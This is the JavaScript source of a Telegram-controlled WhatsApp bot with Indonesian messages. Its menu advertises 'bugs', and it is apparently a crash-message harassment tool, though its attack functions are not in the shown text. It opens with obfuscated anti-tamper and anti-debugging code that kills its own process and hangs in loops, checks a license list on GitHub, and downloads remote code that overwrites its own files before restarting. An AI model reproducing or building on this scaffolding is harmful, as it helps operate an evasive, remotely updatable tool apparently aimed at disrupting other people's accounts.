(function() {
  'use strict'
  
  if (require.main !== module) {
    console.error('\n[!] SECURITY ALERT: Bot dipanggil melalui file lain')
    console.error('[!] File saat ini: ' + __filename)
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'))
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[!] SECURITY ALERT: Terdeteksi parent module')
    console.error('[!] Parent: ' + module.parent.filename)
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  const nativePattern = /\[native code\]/
  const proxyPattern = /Proxy|apply\(target/
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i
  
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('')
  const nativeStr = "[native code]"
  const exitStr = "exit"
  const killStr = "kill"
  const httpsStr = "https"
  const httpStr = "http"
  
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn
  
  try {
    nativeExit = process[exitStr].bind(process)
    nativeKill = process[killStr].bind(process)
    nativeOn = process.on.bind(process)
    nativeExecSync = require("child_process").execSync
    nativePid = process.pid
  } catch(e) {
    nativeExit = process.exit
    nativeKill = process.kill
    nativePid = process.pid
  }
  
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}) } catch(e) {}
      try { nativeExit(1) } catch(e) {}
      try { process.exit(1) } catch(e) {}
      while(1) {}
    }
  })()
  
  try {
    const M = require("module")
    const reqStr = M.prototype.require.toString()
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const exitFn = process[exitStr]
    const exitCode = exitFn.toString()
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override')
      forceKill()
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const killFn = process[killStr]
    const killCode = killFn.toString()
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const onFn = process.on
    const onCode = onFn.toString()
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const axios = require('axios')
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected')
      forceKill()
    }
  } catch(e) {}
  
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest']
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i])
          forceKill()
        }
      } catch(e) {}
    }
  })
  checkGlobals()
  
  try {
    const cp = require("child_process")
    const execStr = cp.execSync.toString()
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString()
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[X] Suspicious global.fetch override detected')
        forceKill()
      }
    }
  } catch(e) {}
  
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr)
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter')
      forceKill()
    }
  } catch(e) {}
  
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr)
        const reqFunc = https.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] https.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] https.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[X] https.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr)
        const reqFunc = http.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] http.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] http.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[X] http.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  setTimeout(() => {
    checkHttps()
    checkHttp()
  }, 500)
  
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected')
        forceKill()
      }
      
      try {
        const M = require("module")
        const reqStr = M.prototype.require.toString()
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr]
        const exitCode = exitFn.toString()
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr]
        const killCode = killFn.toString()
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const axios = require('axios')
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active')
          forceKill()
        }
      } catch(e) {}
      
      checkHttps()
      checkHttp()
      checkGlobals()
    }
  })()
  
  setInterval(monitor, 2000)
  setTimeout(monitor, 100)
  
})()
// ENDING
const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');

let blockedCmds = new Set()

if (fs.existsSync("./cmd.json")) {
  const data = JSON.parse(fs.readFileSync("./cmd.json"))
  blockedCmds = new Set(data.blocked || [])
}

function saveBlocked() {
  fs.writeFileSync("./cmd.json", JSON.stringify({
    blocked: [...blockedCmds]
  }, null, 2))
}
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/turrdb/turrxcero/main/tokens.json';
const thumbnailUrl = "https://files.catbox.moe/x58zg1.jpg";

const thumbnailVideo = "https://files.catbox.moe/5ya1gj.mp4";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`⠀⠀
╭─────「 BYPASS CHEKING 」───
│BOT SUKSES TERHUBUNG TERIMAKASIH
╰───────────────────────
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

setInterval(() => {
  try {
    if (
      process.exit.toString().includes("Proxy") ||
      process.kill.toString().includes("Proxy")
    ) {
      console.log(chalk.yellow("⚠️ Perubahan process terdeteksi"));
      return;
    }
  } catch (err) {
    console.error("Secure check error:", err.message);
  }
}, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await fetchJsonHttps(databaseUrl, 5000);
    const tokens = (res && res.tokens) || [];

    // ─── Cek BOT ID saja (angka sebelum ":") ───────────────────
    const botId = String(tokenBot).split(":")[0];

    const isValid = tokens.some((t) => {
      const id = String(t).split(":")[0];
      return id === botId;
    });

    if (!isValid) {
      console.log(chalk.bold.yellow(`
╭─────「 BYPASS ALRET 」──────
│ ${botId} TIDAK TERDAFTAR DI DATABASE
╰────────────────────────
  `));

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
╭─────「 CHECK SERVER 」─── 
│GITHUB SERVER GAGAL TERHUBUNG
╰─────────────────────
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const GH_OWNER = "zakashoot-dev";
const GH_REPO = "auto-update";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container") {
  const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;

  const { data } = await axios.get(url, {
    headers: { "User-Agent": "Mozilla/5.0" }
  });

  for (const item of data) {
    const local = path.join(basePath, item.path);

    if ([
      "settings/config.js",
      "cmd.json",
      "database/adminuser.json"
    ].includes(item.path)) continue;

    if (item.type === "file") {
      const fileData = await axios.get(item.download_url, {
        responseType: "arraybuffer"
      });

      fs.mkdirSync(path.dirname(local), { recursive: true });
      fs.writeFileSync(local, Buffer.from(fileData.data));
    }

    if (item.type === "dir") {
      fs.mkdirSync(local, { recursive: true });
      await downloadRepo(item.path, basePath);
    }
  }
}

const bot = new Telegraf(tokenBot);

const UPDATE_REPO_RAW     = "https://raw.githubusercontent.com/turrdb/ceroupdate/main/kontolodon.js";
const UPDATE_GITHUB_TOKEN = process.env.GITHUB_TOKEN || ""; // optional, repo private
const UPDATE_TARGET       = path.resolve(__dirname, "kontolodon.js");
const UPDATE_BACKUP       = path.resolve(__dirname, "kontolodon.backup.js");
const UPDATE_TEMP         = path.resolve(__dirname, "kontolodon.temp.js");

const UPDATE_MIN_SIZE = 1000;   
const UPDATE_TIMEOUT = 15000;  
const RESTART_DELAY = 1500;   

let isUpdating = false;

function isBotOwner(id) {
    return Number(id) === Number(ownerID);
}

bot.command("update", async (ctx) => {
    if (!isBotOwner(ctx.from.id)) {
        return ctx.reply("❌ Perintah ini hanya untuk owner!");
    }
    if (isUpdating) {
        return ctx.reply("⚠️ Update sedang berjalan, tunggu sebentar...");
    }
    isUpdating = true;

    let status;
    try {
        status = await ctx.reply(
            "╭── 「 𝖢𝖤𝖱𝖮 𝖴𝖯𝖣𝖠𝖳𝖤 」──╮\n" +
            "│\n" +
            "│ 〥 𝖬𝖾𝗇𝗀𝖾𝖼𝖾𝗄 𝖴𝗉𝖽𝖺𝗍𝖾...\n" +
            "│\n" +
            "│ ⏳ 𝖬𝗈𝗁𝗈𝗇 𝗍𝗎𝗇𝗀𝗀𝗎 𝗌𝖾𝖻𝖾𝗇𝗍𝖺𝗋\n" +
            "│\n" +
            "╰────────────",
            { parse_mode: "Markdown" }
        );
    } catch (e) {
        isUpdating = false;
        return console.error("[UPDATE] Gagal kirim status:", e.message);
    }

    const edit = (text) =>
        ctx.telegram
            .editMessageText(ctx.chat.id, status.message_id, undefined, text, {
                parse_mode: "Markdown",
            })
            .catch(() => {});

    try {
        const { data } = await axios.get(UPDATE_REPO_RAW, {
            timeout: UPDATE_TIMEOUT,
            responseType: "text",
            transformResponse: (r) => r,
            headers: {
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                ...(UPDATE_GITHUB_TOKEN && {
                    Authorization: `token ${UPDATE_GITHUB_TOKEN}`,
                }),
            },
        });

        if (typeof data !== "string" || data.trim().length < UPDATE_MIN_SIZE) {
            throw new Error("File dari repo kosong / terlalu kecil.");
        }
        if (!data.includes("require(") || !data.includes("bot")) {
            throw new Error("Konten bukan file bot yang valid.");
        }

        const current = fs.readFileSync(UPDATE_TARGET, "utf8");
        if (current === data) {
            isUpdating = false;
            return edit(
                "╭── 「 𝖢𝖤𝖱𝖮 𝖴𝖯𝖣𝖠𝖳𝖤 」──╮\n" +
                "│\n" +
                "│ 〥 𝖲𝖳𝖠𝖳𝖴𝖲 : `UP TO DATE`\n" +
                "│\n" +
                "│ ✓ 𝖡𝗈𝗍 𝗌𝗎𝖽𝖺𝗁 𝗆𝖾𝗇𝗀𝗀𝗎𝗇𝖺𝗄𝖺𝗇\n" +
                "│   𝗏𝖾𝗋𝗌𝗂 𝗍𝖾𝗋𝖻𝖺𝗋𝗎\n" +
                "│\n" +
                "│ ✦ 𝖳𝗂𝖽𝖺𝗄 𝖺𝖽𝖺 𝗉𝖾𝗋𝗎𝖻𝖺𝗁𝖺𝗇\n" +
                "│\n" +
                "╰────────────"
            );
        }

        try {
            new vm.Script(data, { filename: "kontolodon.js" });
        } catch (err) {
            throw new Error(`Syntax error di file baru:\n${err.message}`);
        }

        const timestamp  = new Date().toISOString().replace(/[:.]/g, "-");
        const backupPath = `${UPDATE_BACKUP}.${timestamp}`;

        fs.copyFileSync(UPDATE_TARGET, backupPath);
        fs.writeFileSync(UPDATE_TEMP, data);
        fs.renameSync(UPDATE_TEMP, UPDATE_TARGET);

        await edit(
            "╭── 「 𝖢𝖤𝖱𝖮 𝖴𝖯𝖣𝖠𝖳𝖤 」──╮\n" +
            "│\n" +
            "│ 〥 𝖲𝖳𝖠𝖳𝖴𝖲 : `SUCCESS`\n" +
            "│\n" +
            "│ ✓ 𝖴𝗉𝖽𝖺𝗍𝖾 𝖻𝖾𝗋𝗁𝖺𝗌𝗂𝗅\n" +
            "│\n" +
            `│ 💾 𝖡𝖺𝖼𝗄𝗎𝗉 : \`${path.basename(backupPath)}\`\n` +
            "│\n" +
            "│ 〥 𝖠𝗄𝗌𝗂 : `RESTART PANEL`\n" +
            `│ ⏳ 𝖤𝗌𝗍𝗂𝗆𝖺𝗌𝗂 : ± ${RESTART_DELAY / 1000} detik\n` +
            "│\n" +
            "│ ──────────\n" +
            "│ 𝖯𝖺𝗇𝖾𝗅 𝖺𝗄𝖺𝗇 𝗄𝖾𝗆𝖻𝖺𝗅𝗂\n" +
            "│ 𝗈𝗇𝗅𝗂𝗇𝖾 𝗌𝖾𝖼𝖺𝗋𝖺 𝗈𝗍𝗈𝗆𝖺𝗍𝗂𝗌...\n" +
            "│\n" +
            "╰────────────"
        );
        setTimeout(() => process.exit(0), RESTART_DELAY);

    } catch (e) {
        isUpdating = false;
        console.error("[UPDATE ERROR]", e.message);

        if (fs.existsSync(UPDATE_TEMP)) {
            try { fs.unlinkSync(UPDATE_TEMP); } catch (_) {}
        }

        let reason = e.message || "Terjadi kesalahan tidak diketahui.";
        if (e.response?.status === 404)        reason = "File kontolodon.js belum di-update oleh owner repo.";
        else if (e.response?.status === 401)   reason = "Token GitHub tidak valid / expired.";
        else if (e.code === "ECONNABORTED")    reason = "Koneksi timeout ke server repo.";
        else if (e.code === "ENOTFOUND")       reason = "Domain repo tidak dapat dijangkau.";
        else if (reason.length > 120)          reason = reason.slice(0, 120) + "...";

        await edit(
            "╭── 「 𝖢𝖤𝖱𝖮 𝖴𝖯𝖣𝖠𝖳𝖤 」──╮\n" +
            "│\n" +
            "│ 〥 𝖲𝖳𝖠𝖳𝖴𝖲 : `FAILED`\n" +
            "│\n" +
            "│ ⚠️ 𝖠𝗅𝖺𝗌𝖺𝗇 :\n" +
            `│ ${reason}\n` +
            "│\n" +
            "│ ──────────\n" +
            "│ ✓ 𝖡𝗈𝗍 𝗍𝖾𝗍𝖺𝗉 𝖻𝖾𝗋𝗃𝖺𝗅𝖺𝗇\n" +
            "│   𝖽𝖾𝗇𝗀𝖺𝗇 𝗏𝖾𝗋𝗌𝗂 𝗅𝖺𝗆𝖺\n" +
            "│\n" +
            "╰────────────"
        );
    }
});

let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

// ═══════════════════════════════════════════════════════════════════════════
// ─── DISCO BUTTON SYSTEM ─────────────────────────────────────────────────
// ═══════════════════════════════════════════════════════════════════════════
const DISCO_STYLES = ["primary", "danger", "success"];

const getRandomColor = () =>
  DISCO_STYLES[Math.floor(Math.random() * DISCO_STYLES.length)];

const DISCO_INTERVAL = 1000;

const autoColorMessages = new Map();
const menuTypeMap = new Map();
const lastUpdateMap = new Map();

function buildMainKeyboard(color = getRandomColor()) {
  return {
    inline_keyboard: [
      [
        {
          text: "ʙᴜɢs ᴍᴇɴᴜ",
          callback_data: "/bug",
          style: color
        },
        {
          text: "sᴇᴛᴛɪɴɢs ᴍᴇɴᴜ",
          callback_data: "/controls",
          style: color
        }
      ],
      [
        {
          text: "ᴛᴏᴏʟs ᴍᴇɴᴜ",
          callback_data: "/tolos",
          style: color
        },
        {
          text: "ɢᴀᴍᴇs ᴍᴇɴᴜ",
          callback_data: "/gemes",
          style: color
        }
      ],
      [
        {
          text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
          url: "https://t.me/turrjirrr",
          style: color
        },
        {
          text: " ᴄʜᴀɴɴᴇʟs",
          url: "https://t.me/cerochannels",
          style: color
        }
      ]
    ]
  };
}

function buildBackKeyboard(color = getRandomColor()) {
  return {
    inline_keyboard: [
      [
        {
          text: "ʙᴀᴄᴋ",
          callback_data: "/start",
          style: color
        }
      ]
    ]
  };
}

function getKeyboardByType(type, color = getRandomColor()) {
  switch (type) {
    case "controls":
    case "bug":
    case "tolos":
    case "gemes":
      return buildBackKeyboard(color);

    case "main":
    default:
      return buildMainKeyboard(color);
  }
}

async function updateButtonColors(chatId, messageId) {
  if (!autoColorMessages.has(chatId)) return;
  if (autoColorMessages.get(chatId) !== messageId) return;

  const now = Date.now();
  const lastUpdate = lastUpdateMap.get(chatId) || 0;

  if (now - lastUpdate < 2500) return;

  try {
    const currentColor = getRandomColor();
    const type = menuTypeMap.get(chatId) || "main";

    // Keyboard sudah memiliki { inline_keyboard: [...] }
    const keyboard = getKeyboardByType(type, currentColor);

    await bot.telegram.editMessageReplyMarkup(
      chatId,
      messageId,
      undefined,
      keyboard
    );

    lastUpdateMap.set(chatId, now);

  } catch (e) {
    const desc = e.description || "";

    if (desc.includes("429")) {
      const match = desc.match(/retry after (\d+)/);
      const waitTime = match
        ? parseInt(match[1]) * 1000
        : 5000;

      lastUpdateMap.set(
        chatId,
        now + waitTime - 2500
      );

    } else if (desc.includes("message to edit not found")) {
      autoColorMessages.delete(chatId);
      menuTypeMap.delete(chatId);
      lastUpdateMap.delete(chatId);
    }
  }
}

setInterval(() => {
  for (const [chatId, messageId] of autoColorMessages.entries()) {
    updateButtonColors(chatId, messageId);
  }
}, DISCO_INTERVAL);
// AKHIR DISCO INTERVAL
bot.use(async (ctx, next) => {
  if (ctx.message?.text?.startsWith("/")) {
    const cmd = ctx.message.text.split(" ")[0].replace("/", "")

    if (blockedCmds.has(cmd)) {
      return ctx.reply(`🚫 Command /${cmd} sedang dinonaktifkan oleh admin.`)
    }
  }

  return next()
})

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// ═══════════════════════════════════════════════════════════════════════════
// ─── FORCE SUBSCRIBE MIDDLEWARE ──────────────────────────────────────────
// ─── Hanya cek pesan yang berawalan "/" (prefix slash) ───────────────────
// ═══════════════════════════════════════════════════════════════════════════
bot.use(async (ctx, next) => {
  try {
    const userId = ctx.from?.id?.toString();
    if (!userId) return next();

    // Owner bebas
    if (userId == ownerID) return next();

    // Skip button verify
    if (ctx.callbackQuery?.data === 'verify_join') return next();

    // Skip command manajemen channel
    const text = ctx.message?.text || '';
    if (text.startsWith('/setchannel') ||
        text.startsWith('/delchannel') ||
        text.startsWith('/listchannel')) {
      return next();
    }

    // ─── KHUSUS: Cuma cek pesan yang berawalan "/" ─────────────────────
    const isCommand = text.startsWith('/');
    const isButton = !!ctx.callbackQuery;

    if (!isCommand && !isButton) return next();

    const channels = loadChannels();
    if (channels.length === 0) return next();

    // Cek semua channel
    const notJoined = [];
    for (const ch of channels) {
      const joined = await isUserJoinedChannel(userId, ch);
      if (!joined) notJoined.push(ch);
    }

    if (notJoined.length === 0) return next();

    // User belum join semua
    if (ctx.callbackQuery) {
      return ctx.answerCbQuery('❌ Anda belum join semua channel!', { show_alert: true });
    }

    const list = notJoined
      .map((c, i) => `— ☇ Channel ${i + 1} : ${c.startsWith('@') ? c : '@' + c}`)
      .join('\n');

    const joinButtons = notJoined.map((c, i) => {
      const un = c.startsWith('@') ? c.replace('@', '') : c;
      return [{ text: `「 JOIN CH ${i + 1} 」`, url: `https://t.me/${un}` }];
    });
    joinButtons.push([{ text: '「 SAYA SUDAH JOIN 」', callback_data: 'verify_join' }]);

    return ctx.replyWithPhoto(thumbnailUrl, {
      caption: `<blockquote><strong>𝖢𝖤𝖱𝖮 𝖥𝖮𝖱𝖢𝖤𝖲𝖴𝖡𝖲𝖢𝖱𝖨𝖡𝖤
───────────────────</strong></blockquote>

⚠️ <b>WAJIB JOIN CHANNEL</b>

Untuk menggunakan bot ini, Anda wajib
bergabung ke semua channel resmi kami.

<b>Channel yang belum di-join:</b>
${list}

Setelah join, klik tombol
<b>"✅ SAYA SUDAH JOIN"</b> di bawah.

───────────────────`,
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: joinButtons },
    });
  } catch (e) {
    console.error('Force subscribe error:', e.message);
    return next();
  }
});

// ─── Handler verify_join ─────────────────────────────────────────────────
bot.action('verify_join', async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    const channels = loadChannels();

    if (channels.length === 0) {
      return ctx.answerCbQuery('✅ Tidak ada channel wajib.', { show_alert: true });
    }

    const notJoined = [];
    for (const ch of channels) {
      const joined = await isUserJoinedChannel(userId, ch);
      if (!joined) notJoined.push(ch);
    }

    if (notJoined.length === 0) {
      await ctx.answerCbQuery('✅ Verifikasi berhasil!', { show_alert: true });
      try {
        await ctx.editMessageCaption(
          `<blockquote><strong>𝖢𝖤𝖱𝖮 𝖥𝖮𝖱𝖢𝖤 𝖲𝖴𝖡𝖲𝖢𝖱𝖨𝖡𝖤
───────────────────</strong></blockquote>

✅ <b>VERIFIKASI BERHASIL</b>

Ketik /start untuk menu utama.
───────────────────`,
          { parse_mode: 'HTML' }
        );
      } catch {}
    } else {
      const list = notJoined.map((c) => `— ☇ ${c}`).join('\n');
      await ctx.answerCbQuery(`❌ Masih belum join:\n${list}`, { show_alert: true });
    }
  } catch (e) {
    console.error('verify_join error:', e.message);
    await ctx.answerCbQuery('❌ Terjadi error.', { show_alert: true });
  }
});

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'
const channelsFile = './database/channels.json';

function loadChannels() {
  if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
  if (!fs.existsSync(channelsFile)) {
    fs.writeFileSync(channelsFile, JSON.stringify([], null, 2));
    return [];
  }
  try {
    return JSON.parse(fs.readFileSync(channelsFile, 'utf8'));
  } catch {
    return [];
  }
}

function saveChannels(data) {
  if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
  fs.writeFileSync(channelsFile, JSON.stringify(data, null, 2));
}

async function isUserJoinedChannel(userId, channelUsername) {
  try {
    const un = channelUsername.startsWith('@') ? channelUsername : `@${channelUsername}`;
    const member = await bot.telegram.getChatMember(un, userId);
    return ['creator', 'administrator', 'member', 'restricted'].includes(member.status);
  } catch (err) {
    console.log(chalk.yellow(`⚠️ Gagal cek ${channelUsername}: ${err.message}`));
    return false;
  }
}

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
 ██████╗███████╗██████╗  ██████╗ 
██╔════╝██╔════╝██╔══██╗██╔═══██╗
██║     █████╗  ██████╔╝██║   ██║
██║     ██╔══╝  ██╔══██╗██║   ██║
╚██████╗███████╗██║  ██║╚██████╔╝
